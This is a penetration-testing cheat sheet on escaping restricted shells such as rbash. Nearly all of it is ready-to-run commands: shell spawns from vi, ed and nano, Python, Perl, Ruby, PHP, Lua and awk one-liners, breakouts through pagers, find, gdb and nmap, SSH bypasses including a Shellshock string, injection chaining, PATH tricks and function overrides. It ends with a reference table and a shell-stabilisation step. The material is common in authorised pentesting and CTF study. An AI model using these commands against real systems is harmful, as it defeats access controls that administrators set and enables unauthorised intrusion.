## Escaping Restricted Shells

A restricted shell limits what a user can do: commands like `cd`, output redirection, modifying `PATH`, and running binaries with absolute paths may all be blocked. The three most common are `rbash` (restricted Bash), `rksh` (restricted Korn shell), and `rzsh` (restricted Z shell).  Despite these controls, restricted shells are frequently bypassable because they rely on the shell enforcing restrictions rather than the OS, and many programs that are allowed by policy can themselves spawn an unrestricted shell. 
***

## First Steps in Any Restricted Shell

Before attempting any bypass, establish what you can and cannot do:

```bash
# What commands are available?
help               # Built-in commands
compgen -c         # All available commands
echo /*            # List root directory using echo (if ls is blocked)
echo /bin/*        # Check what binaries exist

# What is the current shell?
echo $SHELL
echo $0

# Are any scripting languages available?
which python python3 perl ruby php lua awk 2>/dev/null

# Are any editors available?
which vi vim nano ed 2>/dev/null

# Check PATH
echo $PATH
```

***

## Escape via Text Editors

Text editors that allow shell access are the most reliable bypass method because they are commonly permitted tools. 

### vi and vim

```bash
# Method 1: Set shell then launch it
vi
:set shell=/bin/bash
:shell

# Method 2: Direct command execution from within vi
:!/bin/bash

# Method 3: One-liner without opening a file
vi -c ':!/bin/bash'
```

### ed

```bash
ed
!/bin/bash
```

### nano

```bash
nano
# Press Ctrl+R then Ctrl+X
/bin/bash
```

***

## Escape via Scripting Languages

If any interpreter is available, spawning a shell through it is trivial. 

```bash
# Python
python -c 'import os; os.system("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import os; os.execv("/bin/bash", ["/bin/bash"])'

# Perl
perl -e 'exec "/bin/sh";'
perl -e 'system("/bin/bash");'

# Ruby
ruby -e 'exec "/bin/sh"'

# PHP
php -r 'system("/bin/bash");'
php -a
exec("sh -i");

# Lua
lua -e 'os.execute("/bin/sh")'

# Awk
awk 'BEGIN {system("/bin/bash")}'
```

***

## Escape via System Binaries

These binaries are designed for legitimate use but support shell execution internally.

### Pager Programs (more, less, man)

```bash
more /etc/passwd
# When inside the pager:
!/bin/bash

less /etc/passwd
!/bin/bash

man ls
!/bin/bash
```

### find

```bash
find / -name test -exec /bin/bash \;
find . -exec /bin/sh -i \;
```

### gdb

```bash
gdb
(gdb) !/bin/bash
# or
(gdb) shell
```

### nmap (older versions with --interactive)

```bash
nmap --interactive
nmap> !sh
```

***

## Escape via SSH

If you know the credentials of the restricted user and SSH is available, you can instruct SSH to launch an unrestricted shell instead of the user's default restricted one: 

```bash
# Launch bash bypassing profile restrictions
ssh user@target -t "bash --noprofile"

# Force /bin/sh as the shell
ssh user@target -t "/bin/sh"

# Shellshock (if target is old enough)
ssh user@target -t "() { :; }; /bin/bash"
```

The `--noprofile` flag skips loading `/etc/profile` and `~/.bash_profile`, which is often where the restricted shell is invoked.

***

## Escape via Command Injection and Chaining

When the restricted shell allows some commands to accept arguments, inject additional commands through them:

```bash
# Command substitution in an allowed command
ls -l `pwd`
ls -l $(cat /etc/passwd)

# Semicolon chaining (if metacharacters are permitted)
ls ; /bin/bash
ls ; /bin/sh

# Pipe chaining
ls | /bin/bash

# Backtick injection
ls -l `echo /bin/bash`

# If the shell allows command substitution via $():
echo $(bash)
```

***

## Escape via Environment Variable Manipulation

If the restricted shell uses environment variables to find commands, modifying them can grant access to additional binaries:

```bash
# Add a writable directory to PATH
export PATH=/tmp:$PATH

# Copy bash to /tmp and execute it
cp /bin/bash /tmp/
/tmp/bash -p

# If SHELL variable is used to launch a sub-shell
export SHELL=/bin/bash
exec $SHELL
```

***

## Escape via Shell Functions

If the restricted shell allows function definitions, define a function with the same name as an allowed command that spawns a shell:

```bash
# Define a function named 'ls' that actually launches bash
ls() { /bin/bash; }
ls
```

***

## Quick Reference

| Method | Command | Requires |
|---|---|---|
| vi escape | `:!/bin/bash` | `vi` available |
| Python | `python3 -c 'import os; os.system("/bin/sh")'` | Python available |
| Perl | `perl -e 'exec "/bin/sh";'` | Perl available |
| awk | `awk 'BEGIN {system("/bin/bash")}'` | awk available |
| more/less/man | `!/bin/bash` from within pager | Pager available |
| SSH | `ssh user@host -t "bash --noprofile"` | SSH access and credentials |
| find | `find . -exec /bin/sh -i \;` | find available |
| gdb | `(gdb) !/bin/bash` | gdb available |

The most important step after any escape is to confirm you have a proper unrestricted shell with `echo $SHELL` and `bash --version`, then stabilise it with `python3 -c 'import pty; pty.spawn("/bin/bash")'` before proceeding with further enumeration.
